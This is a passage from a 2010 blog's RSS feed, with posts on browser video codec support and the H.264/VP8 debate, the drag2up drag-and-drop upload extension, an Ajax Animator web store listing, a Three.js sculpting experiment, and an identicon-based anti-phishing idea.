&lt;p&gt;&lt;td&gt;&lt;strong&gt;Firefox&lt;/strong&gt;&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #99cc00;&quot;&gt;Version 4&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #ff9999;&quot;&gt;Never&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #99cc00;&quot;&gt;Version 3.5&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #ff9999;&quot;&gt;Never&lt;/td&gt;
&lt;/tr&gt;&lt;/p&gt;
&lt;p&gt;&lt;tr&gt;&lt;/p&gt;
&lt;p&gt;&lt;td&gt;&lt;strong&gt;Chrome&lt;/strong&gt;&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #99cc00;&quot;&gt;Version 6&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #ff9999;&quot;&gt;Removed in Version 10&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #99cc00;&quot;&gt;Version 3&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #ff9999;&quot;&gt;Never&lt;/td&gt;
&lt;/tr&gt;&lt;/p&gt;
&lt;p&gt;&lt;tr&gt;&lt;/p&gt;
&lt;p&gt;&lt;td&gt;&lt;strong&gt;Opera&lt;/strong&gt;&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #99cc00;&quot;&gt;Version 10.60&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #ff9999;&quot;&gt;Never&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #99cc00;&quot;&gt;Version 10.50&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #ff9999;&quot;&gt;Never&lt;/td&gt;
&lt;/tr&gt;&lt;/p&gt;
&lt;p&gt;&lt;tr&gt;&lt;/p&gt;
&lt;p&gt;&lt;td&gt;&lt;strong&gt;Safari&lt;/strong&gt;&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #ffff00;&quot;&gt;QuickTime&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #99cc00;&quot;&gt;Default QuickTime&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #ffff00;&quot;&gt;QuickTime&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #99cc00;&quot;&gt;Default QuickTime*&lt;/td&gt;
&lt;/tr&gt;&lt;/p&gt;
&lt;p&gt;&lt;tr&gt;&lt;/p&gt;
&lt;p&gt;&lt;td&gt;&lt;strong&gt;IE9&lt;/strong&gt;&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #ffff00;&quot;&gt;Windows Media&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #99cc00;&quot;&gt;Default Windows Media&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #ffff00;&quot;&gt;Windows Media&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #99cc00;&quot;&gt;Default Windows Media&lt;em&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
_&lt;/em&gt; Well, not really &lt;em&gt;anything&lt;/em&gt; imaginable, but a lot of them_&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;QuickTime and Windows Media are pluggable multimedia frameworks. And since Safari and IE9 use them for &amp;lt;video&amp;gt; support, any codec or container format supported by the respective frameworks, works in the browser. For QuickTime, the list for videos goes along the lines of 3GP, Apple Video, AVI, DV, Cinepak, H.261, H.262, H.263, H.264, Microsoft Video 1, MPEG-1, MPEG-4 Part 2, Motion JPEG, Pixlet, Planar RGB, Sorenson Video, Qtch, QuickTime Movie, and QuickTime VR. But these media frameworks are &lt;em&gt;pluggable&lt;/em&gt;, which means they play whatever codecs are installed. It just happens that those codecs listed above are plugins that are installed &lt;em&gt;by default&lt;/em&gt;, somewhat analogous to how Google Chrome bundles Flash. The plugin frameworks for multimedia don’t treat plugins &lt;em&gt;any&lt;/em&gt; different from “native” codecs. There’s absolutely no way to tell the difference from a user perspective. Right clicking a video will give you the same ordinary context menu.&lt;/p&gt;
&lt;p&gt;Codec packs are often installed by users anyway. A codec pack consists of a set of plugins for the operating system’s multimedia framework. Once one of those codecs are installed to the system, support is available to the applications that rely on the OS’s framework: QuickTime Player, Windows Media Player, IE9 and Safari.&lt;/p&gt;
&lt;p&gt;Notably absent are the Opera, Chrome and Firefox browsers that ignore whatever is installed, to use their own bundled decoders. There’s a reason for this, and it’s pretty easy to spot. Firefox, Chrome and Opera are also the only ones on the list that aren’t tied to a specific operating system, and bundling your own media framework lets you keep the functionality consistent. IE and Safari aren’t cross platform. Well, Safari works on Windows, but it still requires QuickTime for Windows to be installed to play the video content.&lt;/p&gt;
&lt;p&gt;You also don’t want all the other video codecs thrown into the mix. Standards are about &lt;em&gt;standardization&lt;/em&gt;, where you have a limited number of codecs instead of an entire forest of them. This brings us to a bit of &lt;em&gt;History&lt;/em&gt;, I’ll begin with the olden days. I can’t tell you too much, as much of the first section happened when I was 6 years old- and certainly wasn’t into the negative user experience of platform-specific multimedia plugins.&lt;/p&gt;
&lt;h2 id=&quot;a-brief-history-of-stuff-named-a-brief-history-&quot;&gt;A Brief History of Stuff Named “A Brief History…”&lt;/h2&gt;
&lt;h4 id=&quot;uh-i-mean-video-on-the-web-&quot;&gt;Uh… I mean, Video on the Web.&lt;/h4&gt;
&lt;p&gt;Before the popularity of HTML5 Video, or event Flash, video was viewed on the web using the RealVideo, MPlayer, VLC, Windows Media Player, and Quicktime &lt;em&gt;Plugins&lt;/em&gt;. Note that pretty little plugins aren’t plugins to the underlying multimedia frameworks: these are the nasty type of plugins that Flash is among. They’re the plugins that take a long time to load, have interfaces that never look like the surrounding page or browser, only work on certain operating systems, at best, inconsistently. This is the epitome of what standardization is meant to prevent, and the distillation of everything that’s wrong with plugin based video.&lt;/p&gt;
&lt;p&gt;Flash’s popularity (probably thanks to YouTube), brought a semblance of &lt;em&gt;standardization&lt;/em&gt; to the industry. Video on the web was delivered through the flv container, encoded either with Sorenson Spark or, in later versions of Flash, On2’s VP6. A while later, H.264/AVC which was later added to Flash, and as the superior codec, most people switched to that and FLV is slowly fading away.&lt;/p&gt;
&lt;p&gt;HTML5 video became popular recently. I’ll say it’s probably because of iOS, since that’s the only way to get web video to play there and the rest of the aggressive marketing that Apple does. This brings us to &lt;em&gt;today &lt;/em&gt;(or at least the general time period of early January 2011 in which I’m writing this post in). Google has just announced it’s intention to remove H.264 from an upcoming revision of the Chrome browser (much like how the Chromium browser &lt;em&gt;never&lt;/em&gt; supported H.264). And everyone on the internet that cares enough to say a word is going insane. Which brings us back to the last section, about how Safari and IE9 use the operating system’s underlying multimedia frameworks and how all the other browsers (Firefox/Chrome/Opera) that work on my beloved operating system (Linux) bundle their own.&lt;/p&gt;
&lt;p&gt;If Firefox, Chrome and Opera used the OS’s media frameworks, we would be set back into the dark ages when people used every video codec imaginable and nobody would be happy. Standards exist for &lt;em&gt;consistency&lt;/em&gt;, and it would be terrible if people started to go on a cost saving measure to never again transcode video, and serve it straight from the server’s filesystem as AVI files containing DV or god forbid MJPEG (the same format the users’s uploaded!) because all the Safaris and IE9s could play it fine. The fact Firefox, Chrome and Opera bundle their own multimedia frameworks forbids the possibility of this, because those browsers (in the forseeable future) will &lt;em&gt;never&lt;/em&gt; support anything other than WebM, Theora and potentially H.264.&lt;/p&gt;
&lt;h2 id=&quot;there-s-more-to-h-264-than-just-h-264&quot;&gt;There’s more to H.264 than just H.264&lt;/h2&gt;
&lt;h4 id=&quot;this-part-doesn-t-make-much-sense-&quot;&gt;This part doesn’t make much sense.&lt;/h4&gt;
&lt;p&gt;Often, the argument against VP8 is that it’s inferior to the H.264 codec, and to me, this seems like the most ideologically valid concern. But in a lot of cases, it stems from a misunderstanding of how H.264 works. H.264 is not a single video codec (not even to mention multimedia container formats), but rather has several &lt;em&gt;Profiles&lt;/em&gt; that work on different devices and implementations. Rarely are videos encoded only in MPEG-4/AVC H.264 Extended Profile at 1080p and 60fps. Go on the Apple store and you’ll see that every iPod device you can find (including the iPhone), includes what video codecs are supported. And it doesn’t just say H.264, but rather, something much more wordy like&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Video formats supported: H.264 video up to 720p, 30 frames per second, Main Profile level 3.1 with AAC-LC audio up to 160 Kbps, 48kHz, stereo audio in .m4v, .mp4, and .mov file formats
For the insanely great &lt;a href=&quot;http://www.apple.com/iphone/specs.html&quot;&gt;iPhone 4&lt;/a&gt;. Google is meaner and doesn’t make the information about profile support on the Nexus S quite as accessible (though it’s not the only reason I’m an iPhone user), but it should be safe to assume it’s something along the lines of what the iPhone 4 supports. The&lt;a href=&quot;http://www.apple.com/ipodclassic/specs.html&quot;&gt; iPod Classic&lt;/a&gt; has a nice, even longer string, that represents even less support for H.264:
H.264 video, up to 1.5 Mbps, 640 by 480 pixels, 30 frames per second, Low-Complexity version of the H.264 Baseline Profile with AAC-LC audio up to 160 Kbps, 48kHz, stereo audio in .m4v, .mp4, and .mov file formats; H.264 video, up to 2.5 Mbps, 640 by 480 pixels, 30 frames per second, Baseline Profile up to Level 3.0 with AAC-LC audio up to 160 Kbps, 48kHz, stereo audio in .m4v, .mp4, and .mov file formats;
This is because very few devices can actually utilize all the great features that H.264 defines. Wikipedia has &lt;a href=&quot;http://en.wikipedia.org/wiki/H.264/MPEG-4_AVC#Profiles&quot;&gt;a nice pretty chart&lt;/a&gt;. So the point of all of this is to say, even though VP8 is inferior to H.264 from a purely technical standpoint, you probably can’t just use the Main or Extended profiles to support all the devices that “support H.264”. Does this invalidate the inferiority argument? Nope. Dark Shikari &lt;a href=&quot;http://x264dev.multimedia.cx/archives/377&quot;&gt;said&lt;/a&gt; “I expect VP8 to be more comparable to VC-1 or H.264 Baseline Profile than with H.264”. But the large number of devices that support H.264 might actually only support the baseline profiles.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;my-hopeless-ideals&quot;&gt;My Hopeless Ideals&lt;/h2&gt;
&lt;h4 id=&quot;better-be-blunt-with-what-will-probably-never-happen-&quot;&gt;Better be blunt with what will probably never happen.&lt;/h4&gt;
&lt;p&gt;VP8 is a bit worse than H.264, and had it been a patent encumbered video format, there would be almost no reason to prefer it over AVC. The &amp;lt;video&amp;gt; part of the HTML5 specification states:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;It would be &lt;strong&gt;helpful for interoperability if &lt;/strong&gt;all browsers could support the same codecs. However, there are no known codecs that satisfy all the current players: &lt;strong&gt;we need a codec that is known to not require per-unit or per-distributor licensing&lt;/strong&gt;, that is &lt;strong&gt;compatible with the open source&lt;/strong&gt; development model, that is of &lt;strong&gt;sufficient quality&lt;/strong&gt; as to be usable, and that is not an additional &lt;strong&gt;submarine patent&lt;/strong&gt; risk for large companies. This is an ongoing issue and this section will be updated once more information is available
The only major codecs that are royalty free are Theora and VP8, and the former probably isn’t of sufficient quality. Both of them come with patent risks (or at least that’s what MPEG-LA wants people to believe), leaving a set of zero acceptable codecs. For this to work at all, something needs to be compromised.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;H.264 defines a baseline profile that all decoders could be reasonably expected to handle. Such a profile exists so that the video can be viewed, albeit with inferior compression on a variety of devices and platforms with limited computational ability. The internet was built on interoperability, and HTML5 needs an equivalent “baseline codec” for the web. Something that compresses video at sufficient, though not bleeding-edge quality. Something that can be implemented and distributed openly on all platforms.&lt;/p&gt;
&lt;p&gt;For HTML5 &amp;lt;audio&amp;gt;, nearly all browsers implement the basic WAV codec. It serves as an acceptable baseline for small snippets of audio to be played in a cross-brower manner. It’s usually uncompressed, and for most applications, inferior to MP3 and Vorbis. &amp;lt;video&amp;gt; needs similar treatment. That niche is, at this time, best filled by WebM/VP8. If Apple and Microsoft were to add support for the WebM format, it would only improve the environment for open innovation. H.264 can be considered the “bleeding-edge” codec, heck, they could even add HEVC/H.265 to set off an environment of useful competition (or not). But a “baseline codec” should be established first. Something that publishers can encode their videos in, so that any modern browser can view.&lt;/p&gt;
&lt;p&gt;Right now, the discussion has been polarized between free software advocates who often seek to eradicate proprietary or patent-encumbered ideas from the face of reality and those who hold a disregard for the open source values. This way of thinking, and of treating innovation is profoundly dangerous for both the free software community and the patent-creators. The free software community can not afford to be constantly twenty years behind the times in terms of innovation (especially if you subscribe to the law of accelerating returns), and the patent-creators can’t afford for the free software community to involved in actively foiling their innovations. It’s truly great what MPEG has done, and it’s terrible that such a controversy exists around its adoption. The best scenario would be for MPEG or the ISO standards bodies to eliminate royalties. The fact multiple industries can agree upon a single, high quality, interoperable codec should be enough of a market and innovation advantage to waive the relatively nominal money from licensing.&lt;/p&gt;
&lt;p&gt;Will this actually happen? I doubt it. Apple seems firmly invested in the success of H.264. Microsoft may be more willing to add VP8 support if and when the format gains popularity (and especially if Google adds patent indemnification just so they can see a lawsuit made). Mozilla will likely never compromise on principle and Opera might add AVC one day. Given the huge backlash, Google’s the most likely to revert its opinion and add AVC back into Chrome in a future release. Yay for hopeless idealism! And since I’m espousing hypothetical and impossible ideas anyway, why not vouch for reform of the U.S. patent system as well? If you think of it, the fact it’s such a controversy and that people need to use an inferior product in order to innovate, that smacks in the face of the very Article 1, Section 8, Clause 8 of the United States Constitution:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;To promote the Progress of Science and useful Arts, by securing for limited Times to Authors and Inventors the exclusive Right to their respective Writings and Discoveries.
And this ends what may be the longest blog post I’ve ever written, revised three times. If you’ve actually read this through, please consider commenting or sending me a tweet at &lt;a href=&quot;http://twitter.com/antimatter15&quot;&gt;@antimatter15&lt;/a&gt; (or following me, that would be great!). Also, if I’m misinformed, please inform me and I &lt;em&gt;might&lt;/em&gt; revise this yet again.&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    <item>
      <title>drag2up 2.0 - drag and drop uploading for all sites</title>
      <link>http://antimatter15.com/2010/12/drag2up-2-0-drag-and-drop-uploading-for-all-sites/</link>
      <pubDate>Sat, 25 Dec 2010 22:22:14 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/12/drag2up-2-0-drag-and-drop-uploading-for-all-sites/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/drag2up%202.0%20-%20drag%20and%20drop%20uploading%20for%20all%20sites/Screenshot-6.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/drag2up%202.0%20-%20drag%20and%20drop%20uploading%20for%20all%20sites/Screenshot-6.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;drag2up firefox dragging twitter&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;drag2up was a &lt;a href=&quot;http://antimatter15.com/2010/12/drag2up-2-0-drag-and-drop-uploading-for-all-sites/2010/10/drag2up-drag-files-onto-any-site/&quot;&gt;browser extension I built a few months ago&lt;/a&gt;, and recently bumped it up to 2.0. The basic idea is to use HTML5 File API and the drag/drop integration that &lt;strong&gt;Chrome and Firefox&lt;/strong&gt; implements to enable uploads to any website by&lt;a href=&quot;http://www.youtube.com/watch?v=DBqxmO-ZrDY&quot;&gt; simply dragging and dropping&lt;/a&gt; the file from your computer onto the respective site. Instead of the trouble of opening a new tab, navigating to your favorite file provider, waiting for it to load, pressing the browse button, navigating to the folder with your image, pressing “Open”, then hitting the submit button, waiting for the upload to finish, copy the link, find the original tab among the mess of tabs that fills your tab bar and finally scrolling down, selecting the box and pasting the URL. All to share a three megabyte file. drag2up streamlines the process into a single, swift gesture where you drag the file onto the text entry field. The link is instantly added while the file is being &lt;strong&gt;uploaded in the background&lt;/strong&gt;. If someone navigates to the link before it’s done uploading, the page uses the Google App Engine Channel API to stream &lt;strong&gt;real time&lt;/strong&gt; upload status.&lt;/p&gt;
&lt;p&gt;It still has a pretty simple user interface that works with &lt;strong&gt;zero initial setup&lt;/strong&gt;. In addition to using gist and imgur for text files and image uploading respectively, it includes many additional services, configurable through a simple drag and drop interface. The new version also sports Firefox support.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2010/drag2up%202.0%20-%20drag%20and%20drop%20uploading%20for%20all%20sites/Selection_004.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/drag2up%202.0%20-%20drag%20and%20drop%20uploading%20for%20all%20sites/Selection_004.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;drag2up settings chrome&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;New Features&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Firefox + Chrome&lt;/li&gt;
&lt;li&gt;Background Uploading&lt;/li&gt;
&lt;li&gt;imgur, imm.io, ImageShack&lt;/li&gt;
&lt;li&gt;Flickr, Picasa&lt;/li&gt;
&lt;li&gt;gist, pastebin, mysticpaste&lt;/li&gt;
&lt;li&gt;Chemical Servers, DAFK, Hotfile&lt;/li&gt;
&lt;li&gt;Dropbox, CloudApp&lt;/li&gt;
&lt;li&gt;Built in URL shorteners
Right now, the only service that doesn’t quite work is Dropbox. The application hasn’t been approved for production status yet. And a number of the hosts do not work with Chrome 8 because of typed arrays and binary XHR issues.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&quot;http://drag2up.appspot.com&quot;&gt;&lt;strong&gt;Try out&lt;/strong&gt; the extension now  :)&lt;/a&gt; I would really appreciate any and all feedback.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2010/drag2up%202.0%20-%20drag%20and%20drop%20uploading%20for%20all%20sites/64cool.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/drag2up%202.0%20-%20drag%20and%20drop%20uploading%20for%20all%20sites/64cool.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;64cool&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Technical Information&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;There’s some pretty cool stuff going on in the new release. This release is really close to the bleeding edge of what’s capable on the web and with browsers. On Chrome, to upload files, the multipart/form-data xhr is being pieced together with array buffers and typed arrays, stuff from the &lt;strong&gt;WebGL&lt;/strong&gt; specification. The Firefox version is based on the latest beta release of &lt;strong&gt;Mozilla Jetpack&lt;/strong&gt; (hacked slightly so that the resulting xpi works with 3.6 as well as 4.0). Transferring data between the background page and the individual content scripts (or pageMods in Jetpack’s terms) is done with the createBlobURL (also called createObjectURL) function and binary XMLHttpRequest. On older versions of Firefox, FileReader is used to load files into base64 encoded data urls. Inter-frame communication is done with postMessage and native JSON serialization and parsing functions.  Picasa and Dropbox support are built on Javascript implementations of OAuth (based on &lt;a href=&quot;https://github.com/bslatkin/clip-it-good&quot;&gt;Clip It Good&lt;/a&gt; and &lt;a href=&quot;https://github.com/kenotron/chromepad&quot;&gt;Chromepad&lt;/a&gt;). So, yeah, there’s lots of new and super cool stuff in there.&lt;/p&gt;
&lt;p&gt;The content script was more or less rewritten in order to support Gmail, which led to some interesting design changes. Firstly, the new version establishes a sort of hierarchy, a difference between a root frame and the most subordinated one. Each drag event is sent to the top using postMessage, where the root frame decides whether or not to render the targets or to remove them. Once the decision is made, it &lt;a href=&quot;https://github.com/antimatter15/drag2up/blob/master/data/drag2up.js#L108&quot;&gt;trickles downward&lt;/a&gt; to each of it’s immediate frames and then trickles back down to each subordinate frame. Whenever a frame is created, a loop detects that one has been added and attempts to access it’s DOM in order to insert a script element that initializes the code. Interestingly, content scripts (in chrome) are unable to access the child frames so a script needs to be inserted into the immediate page in order to insert a script into a child page. The scripts also set document.__drag2up to ensure there aren’t any frames that load themselves twice (interestingly creating an event and dispatching it seeing if there’s a event listener that does preventDefault isn’t a reliable indicator. I wanted to ideally create a system that was mostly undetectable by the parent page, but eventually settled for this simpler and more reliable implementation).&lt;/p&gt;
&lt;p&gt;Once the “trickle_reactivate” message (every message happens to be eighteen characters, because  of certain really weird design ideas) is recieved by all the frames, they loop through all the elements on the page, searching for elements that meet the isDroppable criteria. It does not trigger on elements who have a width*height &amp;lt; 100, so no really tiny boxes. It needs to be an input element type text or textarea that isn’t read only or disabled, or it needs to be an element whose contents are editable. Then it checks the positioning of the element using the document.elementFromPoint function twice (one accounting for scrolling and one that doesn’t to differentiate fixed positioning from others). The drop target is a div with a massive style attribute. It has rounded corners, css transitions and is positioned either absolutely or fixed based on the positioning of the associated input element. It’s centered around the element or completely covers it for smaller areas. When the user hovers over it, the opacity changes (the behavior is actually reversed from the last version). The original version faded out slightly when hovered over, which, after some thought, I realized made no sense. Similar to the drop target is a purple settings box on the lower right corner. I’m actually quite displeased with it. It’s not a great user experience, but at least it’s noticable. Primarily, it was added because I have no idea how to get the Preferences button to work with Jetpack and Google manages to bury the Options button somewhere deep within the depths of Chrome’s single menu.&lt;/p&gt;
&lt;p&gt;Once the file is dropped, the content script decides whether it was a file that was dropped or an image that was dropped from some other page. If it’s an image (because that’s the simpler case to deal with), it does something that’s actually slightly counterintuitive. Using getData(‘text/uri-list’) isn’t reliable as in many cases, the image is wrapped in a link tag and that only gives the link URL instead of that image. So instead, it reads text/html and inserts it into a temporary div and pulls out the source attribute which is then sent to the background page. If the thing that was dropped is a file, first, it checks if the browser supports one of the Blob URI creation methods and if that’s available, it uses that to create a URL. If not, the file is read using FileReader as a base64 encoded data url and sent to the background page. But not immediately, because often the script is running in an unprivledged environment, so it does a postMessage to the topmost parent which should be privileged. The privileged content script sends the message to the even more privileged background page that initiates the actual uploading process.&lt;/p&gt;
&lt;p&gt;Before going into what the background page actually does, there’s the settings page. I’m actually pretty proud of how it turned out. With the large number of hosts that are supported, I needed a way for the user to select hosts for different types of files. I could have used select boxes, but they’re not generally great when dealing with image based concepts, because a company’s logo is often more recognizable than the name (odd that I’m saying that, seeing as this blog has neither a distinctive name nor even a favicon). So instead, I built this little grid where the user can drag hosts into boxes on the right. It’s made with jQuery UI, because I don’t particularly like the API’s provided in HTML5.&lt;/p&gt;
&lt;p&gt;The background page handles the uploading. Basically, there’s a bunch of javascript files that are loaded into it. The hardest part was by far, OAuth. If anything, this project has only refined my dislike of OAuth. And because this post is already insanely long, I’ll go and rant about the problems of OAuth anyway. There’s already&lt;a href=&quot;http://arstechnica.com/security/guides/2010/09/twitter-a-case-study-on-how-to-do-oauth-wrong.ars&quot;&gt; a great article on how terrible of an idea&lt;/a&gt; it is for OAuth to be used in any application that runs code on the client. But Photobucket, Picasa and Dropbox still don’t understand that (or don’t care) and only provide OAuth. But that’s not really a problem, I just hate OAuth because even though It’s a standard, each service provider has some little quirks that take hours to debug and ends up being extremely frustrating. Maybe the OAuth gods are angry with me or something, but it’s incredibly troublesome.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://drag2up.appspot.com&quot;&gt;Try out the extension now  :)&lt;/a&gt; I would really appreciate any and all feedback.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Ajax Animator on Chrome Web Store</title>
      <link>http://antimatter15.com/2010/12/ajax-animator-on-chrome-web-store/</link>
      <pubDate>Tue, 07 Dec 2010 00:01:39 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/12/ajax-animator-on-chrome-web-store/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;https://chrome.google.com/webstore/detail/ginffkjapdobanedcblllenliboglpkp&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Ajax%20Animator%20on%20Chrome%20Web%20Store/ajaxwebstore.png&quot; &gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;So now that the chrome web store has launched, &lt;a href=&quot;https://chrome.google.com/webstore/detail/ginffkjapdobanedcblllenliboglpkp&quot;&gt;it’s there&lt;/a&gt;. You can use it offline and it stores progress with localStorage.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Digital Sculpting with Three.JS</title>
      <link>http://antimatter15.com/2010/11/digital-sculpting-with-three-js/</link>
      <pubDate>Tue, 23 Nov 2010 04:51:33 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/11/digital-sculpting-with-three-js/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;http://dl.dropbox.com/u/1024307/3d-sculpt/sculpt.html&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Digital%20Sculpting%20with%20Three.JS/download.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;download&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The above testament to my artistic ability, or specifically my lack thereof, was made in my experiment with digital sculpting, &lt;a href=&quot;http://antimatter15.com/2010/11/digital-sculpting-with-three-js/2010/09/3d-sculpting-tool/&quot;&gt;technically, part II&lt;/a&gt;. Wikipedia says&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Digital sculpting&lt;/strong&gt; is the use of software that offers tools to push, pull, smooth, grab, pinch or otherwise manipulate a digital object as if it were made of a real-life substance such as clay.
I saw&lt;a href=&quot;http://lifehacker.com/5607134/sculptris-is-a-user+friendly-3d-modeling-and-sculpting-program&quot;&gt; this Lifehacker article &lt;/a&gt;on sculptris a few months ago and it sort of made an impression on me of how cool and awesome 3d was. Any real program is of course much different and better than this one because of the ability to actually grab, smooth and pinch the digital object.&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    <item>
      <title>insanely simple anti-phishing system</title>
      <link>http://antimatter15.com/2010/11/insanely-simple-anti-phishing-system/</link>
      <pubDate>Fri, 12 Nov 2010 01:48:32 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/11/insanely-simple-anti-phishing-system/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/insanely%20simple%20anti-phishing%20system/1_vgexamples_F_k1pC2sJzEqEynh.jpg&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/insanely%20simple%20anti-phishing%20system/1_vgexamples_F_k1pC2sJzEqEynh.jpg&quot; &gt;&lt;div class=&quot;caption&quot;&gt;1_vgexamples_F_k1pC2sJzEqEynh&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Here’s an idea for fighting phishing that seems to be a good idea (at least to me). I’m no security expert, but from what I understand about MITM and other issues, this should provide a decent solution. It could probably even help&lt;a href=&quot;http://www.azarask.in/blog/post/a-new-type-of-phishing-attack/&quot;&gt; fight tabnapping.&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The identicon was first thought of by Don Park and he has envisioned &lt;a href=&quot;http://web.archive.org/web/20080510221519/http://www.docuverse.com/blog/donpark/2007/01/22/identicon-based-anti-phishing-protection&quot;&gt;something pretty interesting&lt;/a&gt; that uses identicons for a similar purpose, however it requires certain changes to user agents and no browsers have yet implemented it.&lt;/p&gt;
&lt;p&gt;The basic idea is that on the login page, the server generates an Identicon based on the hash of the user’s IP address and a certain &lt;a href=&quot;http://en.wikipedia.org/wiki/Salt_(cryptography&quot;&gt;secret salted string&lt;/a&gt;). This will generate a unique, and extremely hard-to-fake image that is associated with whatever computer (or network under NAT) the user is at. The great thing is that it requires absolutely no changes to the existing user experience, isn’t too aesthetically jarring and completely ignorable. If the user’s under a proxy and is aware of it, this doesn’t detract from the user experience, it’s just a visual sign that the user might be on the wrong site and it’s up to the user to decide whether or not to go on.&lt;/p&gt;
&lt;p&gt;The login identicon is a unique signature of the server you’re communicating to and the IP address of your computer, if either one is slightly different, the icon will be completely different.&lt;/p&gt;
&lt;p&gt;As the tabnapping issue shows, the problem isn’t that users are too lazy to read the URL bar, it shouldn’t even really be necessary to read the URL bar. There are far too many funky unicode hacks that can make URLs look like other URLs, and people’s memory of exact textual strings isn’t that good. Plus, imagine how much of humanity’s time will be wasted having to break the usual eye movement and look at a small box on the top, thinking intensely for a few seconds before returning back to the usual login procedure. Expecting people to do that is just too much.&lt;/p&gt;
&lt;p&gt;This solution, however should provide an image that can be embedded (ideally) on or immediately next to the login box, so the user just notices it instead of searching for it.&lt;/p&gt;
&lt;p&gt;&lt;del datetime=&quot;2010-12-23T23:49:32+00:00&quot;&gt;I’ll probably provide a proof of concept soon, it’s six in the morning and I’m about to go to school. &lt;/del&gt; And &lt;a href=&quot;http://antimatter15.com/misc/identicon/login.php&quot;&gt;here&lt;/a&gt; it is.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Simple Anti Phishing Mechanism</title>
      <link>http://antimatter15.com/2010/11/simple-anti-phishing-mechanism/</link>
      <pubDate>Fri, 12 Nov 2010 00:41:18 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/11/simple-anti-phishing-mechanism/</guid>
      <author></author>
